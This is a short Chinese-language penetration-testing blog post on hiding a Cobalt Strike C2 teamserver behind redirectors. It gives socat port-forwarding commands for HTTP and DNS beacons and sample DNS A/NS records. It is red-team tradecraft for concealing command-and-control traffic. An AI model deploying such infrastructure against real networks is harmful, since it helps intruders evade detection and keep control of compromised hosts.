---
title: "Cobalt Strike 重定向器"
date: 2019-07-06T00:00:00+08:00
draft: false
tags: ["cobalt strike"]
categories: ["内网渗透"]
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

cobalt strike 通过重定向器来隐藏 c2 服务器.

本质其实就是用其它机器作为中转来连接 teamserver

以下提供两种方式, 端口转发工具不仅限于 socat

<!--more-->

## http beacon

在重定向器中执行命令

```
socat TCP4-LISTEN:8080,fork TCP4:[team server]:8080
```

添加 beacon

![redirector http beacon 1](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/redirector_http_beacon_1.jpg)

添加重定向器的 IP 或域名地址, 如果有多个重定向器, 将他们用逗号分隔.

![redirector http beacon 2](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/redirector_http_beacon_2.jpg)

## dns beacon

配置不同的 A 记录指向重定向器的 IP

之后配置 NS 记录指向重定向器所在域名.

```
r1         A   192.168.1.100
r2         A   192.168.1.101
r3         A   192.168.1.102
profile    NS  r1.exp10it.cn
games      NS  r2.exp10it.cn
pictures   NS  r3.exp10it.cn
```

在重定向器中执行命令, 如果使用 `windows/beacon_dns/reverse_dns_txt` 则仅须转发 53 端口.

```
socat UDP4-LISTEN:53,fork UDP4:[team server]:53
socat TCP4-LISTEN:8080,fork TCP4:[team server]:8080
```

添加 beacon

![redirector dns beacon 1](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/redirector_dns_beacon_1.jpg)

添加重定向器的 NS 域名, 如果有多个重定向器, 将他们用逗号分隔.

![redirector dns beacon 2](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/redirector_dns_beacon_2.jpg)